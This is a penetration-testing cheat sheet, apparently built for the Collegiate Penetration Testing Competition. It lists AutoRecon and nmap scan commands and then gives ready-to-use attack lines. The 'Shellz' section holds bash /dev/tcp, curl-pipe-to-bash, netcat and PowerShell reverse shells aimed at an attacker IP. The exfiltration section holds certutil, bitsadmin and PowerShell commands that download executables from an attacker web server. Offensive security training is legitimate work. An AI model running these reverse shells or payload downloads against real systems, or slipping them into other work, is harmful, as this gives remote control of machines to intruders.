# CPTC Notes

# Scanning

## Autorecon

Go straight up ez mode with [Autorecon](https://github.com/Tib3rius/AutoRecon)

```bash
sudo apt install python3
sudo apt install python3-pip
sudo apt install seclists curl dnsrecon enum4linux feroxbuster gobuster impacket-scripts nbtscan nikto nmap onesixtyone oscanner redis-tools smbclient smbmap snmp sslscan sipvicious tnscmd10g whatweb wkhtmltopdf
sudo apt install python3-venv
python3 -m pip install --user pipx
python3 -m pipx ensurepath
source ~/.zshrc ## or .bashrc if old
pipx install git+https://github.com/Tib3rius/AutoRecon.git

## Run scans as sudo using one of the following
sudo env "PATH=$PATH" autorecon [OPTIONS]
sudo $(which autorecon) [OPTIONS]

## Example
sudo $(which autorecon) 10.10.10.10
```

## NMAP (fallback)

```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP> 
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP> 
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP> 
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```

# Enumeration

## Yummy PEAS (Win/Nix)

[https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)

# Exploitation

## Shellz

[Linux](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux)

```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```

[Windows](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows)

```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

- [LOLBAS (Windows)](https://lolbas-project.github.io/#)
- [GTFOBins (Linux)](https://gtfobins.github.io/)

## Active Directory

- [Impacket](https://github.com/fortra/impacket)
- [Netwrix Attacks + Remediation](https://www.netwrix.com/attack.html)
- [The OGs](https://adsecurity.org/)

# Exfiltration

## Windows

```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```

## Linux

```bash
## Get shell from https://github.com/infodox/python-pty-shells/blob/master/tcp_pty_backconnect.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
```

# Infra Stuff

```bash
## Ez webserver to host shells
python3 -m http.server 80
```

# Resources

Holy Grail: [https://book.hacktricks.xyz/welcome/readme](https://book.hacktricks.xyz/welcome/readme)